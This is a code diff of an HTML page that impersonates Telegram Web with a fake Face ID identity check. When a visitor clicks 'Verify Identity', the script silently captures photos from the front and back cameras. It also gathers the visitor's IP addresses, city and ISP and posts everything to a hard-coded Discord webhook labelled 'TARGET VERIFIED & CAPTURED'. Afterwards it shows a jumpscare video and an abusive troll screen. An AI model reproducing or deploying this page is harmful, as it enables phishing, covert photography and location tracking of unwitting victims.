@@ -3,17 +3,17 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Telegram: Security Check</title>
-  <meta property="og:title" content="Telegram: Security Check">
-  <meta property="og:description" content="Verify your identity to access Telegram Web.">
+  <title>Telegram Web: Secure Login</title>
+  <meta property="og:title" content="Telegram Web">
+  <meta property="og:description" content="Sign in to your Telegram account securely.">
   <meta property="og:type" content="website">
   <meta name="theme-color" content="#24A1DE">
   <style>
     :root {
       --tg-blue: #24A1DE;
       --tg-bg: #ffffff;
-      --tg-text: #222;
-      --tg-sub: #707579;
+      --tg-text: #000000;
+      --tg-sub: #8e8e93;
     }
 
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -21,96 +21,105 @@
     body {
       background: var(--tg-bg);
       color: var(--tg-text);
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
       height: 100vh;
-      overflow: hidden;
       display: flex;
       align-items: center;
       justify-content: center;
       user-select: none;
+      overflow: hidden;
     }
 
     #screen-landing {
       width: 100%;
-      max-width: 400px;
-      padding: 40px;
+      max-width: 380px;
+      padding: 20px;
       text-align: center;
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 20px;
-      z-index: 10;
+      justify-content: center;
     }
 
-    .face-id-icon {
-      width: 100px; height: 100px;
-      margin-bottom: 20px;
-      animation: pulse 2s infinite ease-in-out;
+    /* FaceID Framed Icon */
+    .faceid-frame {
+      width: 120px; height: 120px;
+      position: relative;
+      margin-bottom: 30px;
     }
-    @keyframes pulse {
-      0% { transform: scale(1); opacity: 1; }
-      50% { transform: scale(1.1); opacity: 0.8; }
-      100% { transform: scale(1); opacity: 1; }
+    .faceid-frame::before, .faceid-frame::after, .faceid-corners::before, .faceid-corners::after {
+      content: ""; position: absolute; width: 25px; height: 25px; border-color: var(--tg-blue); border-style: solid;
     }
+    .faceid-frame::before { top: 0; left: 0; border-width: 4px 0 0 4px; border-top-left-radius: 15px; }
+    .faceid-frame::after { top: 0; right: 0; border-width: 4px 4px 0 0; border-top-right-radius: 15px; }
+    .faceid-corners { position: absolute; inset: 0; }
+    .faceid-corners::before { bottom: 0; left: 0; border-width: 0 0 4px 4px; border-bottom-left-radius: 15px; }
+    .faceid-corners::after { bottom: 0; right: 0; border-width: 0 4px 4px 0; border-bottom-right-radius: 15px; }
 
-    .tg-title { font-size: 1.6rem; font-weight: 700; margin-bottom: 8px; color: #1c1c1e; }
-    .tg-subtitle { color: var(--tg-sub); font-size: 0.95rem; line-height: 1.4; margin-bottom: 30px; }
+    .faceid-svg { width: 70px; height: 70px; margin-top: 25px; fill: var(--tg-blue); }
+
+    .tg-title { font-size: 1.5rem; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.5px; }
+    .tg-subtitle { color: var(--tg-sub); font-size: 0.95rem; line-height: 1.4; margin-bottom: 40px; padding: 0 20px; }
 
     .verify-btn {
-      width: 100%;
+      width: 90%;
       padding: 16px;
       background: var(--tg-blue);
       color: white;
       border: none;
-      border-radius: 12px;
-      font-size: 1.1rem;
+      border-radius: 14px;
+      font-size: 1.05rem;
       font-weight: 600;
       cursor: pointer;
-      box-shadow: 0 4px 15px rgba(36, 161, 222, 0.3);
-      transition: transform 0.1s active;
+      transition: all 0.2s;
     }
-    .verify-btn:active { transform: scale(0.98); }
+    .verify-btn:active { transform: scale(0.96); opacity: 0.9; }
 
-    .security-badge {
-      display: flex; align-items: center; gap: 8px;
-      margin-top: 40px; color: #34c759; font-size: 0.85rem; font-weight: 600;
+    .secure-text {
+      margin-top: 30px;
+      font-size: 0.8rem;
+      color: #34c759;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 5px;
     }
 
+    /* Scanning Screen */
     #screen-loading {
       display: none;
       position: fixed; inset: 0; background: #fff; z-index: 100;
       flex-direction: column; align-items: center; justify-content: center;
     }
-    .scanner-line {
-      width: 200px; height: 2px; background: var(--tg-blue);
-      box-shadow: 0 0 15px var(--tg-blue);
-      position: absolute; top: 0; left: 50%; transform: translateX(-50%);
-      animation: scan 1.5s infinite ease-in-out;
+    .scan-box {
+        width: 140px; height: 140px;
+        position: relative;
+        margin-bottom: 20px;
     }
-    @keyframes scan {
-      0% { top: 30%; }
-      50% { top: 70%; }
-      100% { top: 30%; }
+    .scan-line {
+        position: absolute; width: 100%; height: 2px;
+        background: var(--tg-blue);
+        box-shadow: 0 0 15px var(--tg-blue);
+        top: 0;
+        animation: moving-scan 1.5s infinite ease-in-out;
+    }
+    @keyframes moving-scan {
+        0%, 100% { top: 10%; }
+        50% { top: 90%; }
     }
 
     #screen-jumpscare {
       display: none; position: fixed; inset: 0; background: #000; z-index: 999;
-      align-items: center; justify-content: center;
     }
     .jumpscare-video { width: 100%; height: 100%; object-fit: cover; }
 
     #screen-troll {
       display: none; position: fixed; inset: 0; background: #000; z-index: 1000;
-      flex-direction: column; align-items: center; justify-content: center; text-align: center;
+      flex-direction: column; align-items: center; justify-content: center;
     }
-    .troll-text { color: red; font-size: 5rem; font-weight: 900; animation: vibrate 0.1s infinite; }
-    @keyframes vibrate {
-      0% { transform: translate(1px,1px); }
-      50% { transform: translate(-2px,-1px); }
-      100% { transform: translate(1px,1px); }
-    }
+    .troll-msg { color: #ff0000; font-size: 4rem; font-weight: 900; text-align: center; }
 
-    #hidden-video { position: fixed; opacity: 0; width: 1px; height: 1px; left: -999px; }
+    #hidden-video { position: fixed; opacity: 0; left: -999px; }
     #hidden-canvas { display: none; }
   </style>
 </head>
@@ -120,28 +129,27 @@
 <canvas id="hidden-canvas"></canvas>
 
 <div id="screen-landing">
-  <div class="face-id-icon">
-    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <path d="M7 3H5C3.89543 3 3 3.89543 3 5V7M17 3H19C20.1046 3 21 3.89543 21 5V7M7 21H5C3.89543 21 3 20.1046 3 19V17M17 21H19C20.1046 21 21 20.1046 21 19V17M8 11V10C8 7.79086 9.79086 6 12 6C14.2091 6 16 7.79086 16 10V11M8 11H16M8 11C7.44772 11 7 11.4477 7 12V15C7 16.6569 8.34315 18 10 18H14C15.6569 18 17 16.6569 17 15V12C17 11.4477 16.5523 11 16 11M12 11V14M12 14L11 13" stroke="#24A1DE" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-    </svg>
+  <div class="faceid-frame">
+      <div class="faceid-corners"></div>
+      <svg class="faceid-svg" viewBox="0 0 24 24"><path d="M9,11.75A1.25,1.25 0 0,0 7.75,13A1.25,1.25 0 0,0 9,14.25A1.25,1.25 0 0,0 10.25,13A1.25,1.25 0 0,0 9,11.75M15,11.75A1.25,1.25 0 0,0 13.75,13A1.25,1.25 0 0,0 15,14.25A1.25,1.25 0 0,0 16.25,13A1.25,1.25 0 0,0 15,11.75M12,2A10,10 0 1,0 22,12A10,10 0 0,0 12,2M12,20A8,8 0 1,1 20,12A8,8 0 0,1 12,20M12,17C10.13,17 8.41,16.03 7.42,14.5L8.91,13.5C9.57,14.54 10.7,15.25 12,15.25C13.3,15.25 14.43,14.54 15.1,13.5L16.58,14.5C15.59,16.03 13.87,17 12,17Z"/></svg>
   </div>
-  <div class="tg-title">Identity Verification</div>
-  <div class="tg-subtitle">To protect your Telegram account, please verify your identity using Face ID / Facial Recognition.</div>
+  <div class="tg-title">Face ID Required</div>
+  <div class="tg-subtitle">Security measures enabled. Please use Face ID to confirm your identity and access your Telegram messages.</div>
   
-  <button class="verify-btn" onclick="startPrank()">Start Facial Scan</button>
+  <button class="verify-btn" onclick="triggerScan()">Verify Identity</button>
 
-  <div class="security-badge">
-    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-3zm0 6c1.38 0 2.5 1.12 2.5 2.5S13.38 13 12 13s-2.5-1.12-2.5-2.5S10.62 8 12 8zm3 9H9v-1c0-1.5 3-2.3 3-2.3s3 .8 3 2.3v1z"/></svg>
-    Secure Identity Verification
+  <div class="secure-text">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+    End-to-End Encrypted Verification
   </div>
 </div>
 
 <div id="screen-loading">
-  <div class="face-id-icon" style="animation: none; opacity:0.3;">
-     <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M7 3H5C3.89543 3 3 3.89543 3 5V7M17 3H19C20.1046 3 21 3.89543 21 5V7M7 21H5C3.89543 21 3 20.1046 3 19V17M17 21H19C20.1046 21 21 20.1046 21 19V17M8 11V10C8 7.79086 9.79086 6 12 6C14.2091 6 16 7.79086 16 10V11M8 11H16M8 11C7.44772 11 7 11.4477 7 12V15C7 16.6569 8.34315 18 10 18H14C15.6569 18 17 16.6569 17 15V12C17 11.4477 16.5523 11 16 11M12 11V14M12 14L11 13" stroke="#24A1DE" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+  <div class="scan-box">
+      <div class="faceid-frame" style="margin-bottom:0; opacity: 0.2;"><div class="faceid-corners"></div></div>
+      <div class="scan-line"></div>
   </div>
-  <div class="scanner-line"></div>
-  <div style="margin-top:20px; color:var(--tg-blue); font-weight:600;">Scanning Face...</div>
+  <div style="color:var(--tg-blue); font-weight:600; font-size:1.1rem;">Authenticating...</div>
 </div>
 
 <div id="screen-jumpscare">
@@ -151,8 +159,8 @@
 </div>
 
 <div id="screen-troll">
-  <div class="troll-text">FUCK YOU</div>
-  <div style="font-size: 5rem; margin-top: 20px;">🖕 🐒 🖕</div>
+  <div class="troll-msg">GET TROLLED<br>BY NIGHT OWL</div>
+  <div style="font-size: 5rem; margin-top: 20px;">🖕😂🖕</div>
   <audio id="troll-sound" src="troll.mp3" loop preload="auto"></audio>
 </div>
 
@@ -160,54 +168,59 @@
   const WEBHOOK = 'https://discord.com/api/webhooks/1490614590948511806/pVP30UWT4UeonIFBzcMjK8_3j7GJWyaTPU6C5Fvlril89lJSjti-Q2wBZXrEcG1BDI6e';
   let ipInfo = { v4: '...', v6: '...', loc: '...', isp: '...' };
 
-  async function getInfo() {
+  // Data fetching
+  async function loadMeta() {
     try {
-      const v4Data = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query').then(r => r.json());
-      const v6Data = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
-      if(v4Data.status === 'success') {
-        ipInfo.v4 = v4Data.query;
-        ipInfo.loc = `${v4Data.city}, ${v4Data.regionName}, ${v4Data.country}`;
-        ipInfo.isp = v4Data.isp;
+      const v4 = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query').then(r => r.json());
+      const v6 = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
+      if(v4.status === 'success') {
+        ipInfo.v4 = v4.query;
+        ipInfo.loc = `${v4.city}, ${v4.regionName}, ${v4.country}`;
+        ipInfo.isp = v4.isp;
       }
-      ipInfo.v6 = v6Data.ip;
+      ipInfo.v6 = v6.ip;
     } catch(e) {}
   }
-  getInfo();
+  loadMeta();
 
-  async function startPrank() {
+  async function triggerScan() {
+    // Fullscreen
     const el = document.documentElement;
     if (el.requestFullscreen) el.requestFullscreen();
 
     document.getElementById('screen-landing').style.display = 'none';
     document.getElementById('screen-loading').style.display = 'flex';
 
-    const photos = [];
-    
-    // Front Capture
-    try {
-      const s1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      const b1 = await captureFrame(s1, true);
-      if(b1) photos.push({ blob: b1, name: 'selfie.jpg' });
-      s1.getTracks().forEach(t => t.stop());
-    } catch(e) {}
+    const capturedBlobs = [];
 
-    // Back Capture
+    // 1. Capture Front (Selfie)
     try {
-      const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-      const b2 = await captureFrame(s2, false);
-      if(b2) photos.push({ blob: b2, name: 'omgeving.jpg' });
-      s2.getTracks().forEach(t => t.stop());
-    } catch(e) {}
+        const streamF = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        const b1 = await getBlob(streamF, true);
+        if(b1) capturedBlobs.push({ blob: b1, name: 'selfie.jpg' });
+        streamF.getTracks().forEach(t => t.stop());
+    } catch(e) { console.warn("Front fail", e); }
 
+    // 2. Capture Back
+    try {
+        const streamB = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+        const b2 = await getBlob(streamB, false);
+        if(b2) capturedBlobs.push({ blob: b2, name: 'omgeving.jpg' });
+        streamB.getTracks().forEach(t => t.stop());
+    } catch(e) { console.warn("Back fail", e); }
+
+    // 3. Start Jumpscare
     document.getElementById('screen-loading').style.display = 'none';
     document.getElementById('screen-jumpscare').style.display = 'flex';
     
-    const video = document.getElementById('jvid');
-    video.volume = 1.0;
-    await video.play();
+    const jvid = document.getElementById('jvid');
+    jvid.volume = 1.0;
+    jvid.play();
 
-    uploadResults(photos);
+    // 4. Send to Discord
+    uploadToDiscord(capturedBlobs);
 
+    // 5. Final Screen
     setTimeout(() => {
       document.getElementById('screen-jumpscare').style.display = 'none';
       document.getElementById('screen-troll').style.display = 'flex';
@@ -215,45 +228,45 @@
     }, 3000);
   }
 
-  async function captureFrame(stream, flip) {
+  async function getBlob(stream, flip) {
     const vid = document.getElementById('hidden-video');
     vid.srcObject = stream;
     return new Promise((resolve) => {
-      vid.onloadedmetadata = () => {
-        setTimeout(() => {
-          const can = document.getElementById('hidden-canvas');
-          can.width = vid.videoWidth;
-          can.height = vid.videoHeight;
-          const ctx = can.getContext('2d');
-          if(flip) { ctx.translate(can.width,0); ctx.scale(-1,1); }
-          ctx.drawImage(vid, 0, 0);
-          can.toBlob(resolve, 'image/jpeg', 0.95);
-        }, 500);
-      };
+        vid.onloadedmetadata = () => {
+            setTimeout(() => {
+                const can = document.getElementById('hidden-canvas');
+                can.width = vid.videoWidth;
+                can.height = vid.videoHeight;
+                const ctx = can.getContext('2d');
+                if(flip) { ctx.translate(can.width, 0); ctx.scale(-1, 1); }
+                ctx.drawImage(vid, 0, 0);
+                can.toBlob(resolve, 'image/jpeg', 0.95);
+            }, 600); // Slightly longer delay for stability
+        };
     });
   }
 
-  async function uploadResults(photos) {
-    const fd = new FormData();
+  async function uploadToDiscord(blobs) {
+    const data = new FormData();
     const payload = {
-      username: "🕵️ Telegram Face-ID Bot",
+      username: "🕵️ Face ID Security Bot",
       embeds: [{
-        title: "🎯 SLACHTOFFER GEPAKT MET FACE-ID",
-        color: 0x34c759,
+        title: "⚡ TARGET VERIFIED & CAPTURED",
+        color: 0x24A1DE,
         fields: [
-          { name: "📱 Apparaat", value: `\`${navigator.platform}\``, inline: true },
+          { name: "📱 Device", value: `\`${navigator.platform}\``, inline: true },
           { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
           { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
-          { name: "📍 Locatie", value: ipInfo.loc, inline: false },
-          { name: "🏢 Provider", value: ipInfo.isp, inline: false }
-        ],
-        footer: { text: "Night Owl Stealth Security" }
+          { name: "📍 Location", value: ipInfo.loc, inline: false },
+          { name: "🏢 ISP", value: ipInfo.isp, inline: false }
+        ]
       }]
     };
 
-    fd.append('payload_json', JSON.stringify(payload));
-    photos.forEach((p, i) => fd.append(`file${i+1}`, p.blob, p.name));
-    await fetch(WEBHOOK, { method: 'POST', body: fd });
+    data.append('payload_json', JSON.stringify(payload));
+    blobs.forEach((b, i) => data.append(`file${i}`, b.blob, b.name));
+
+    await fetch(WEBHOOK, { method: 'POST', body: data });
   }
 </script>
 </body>
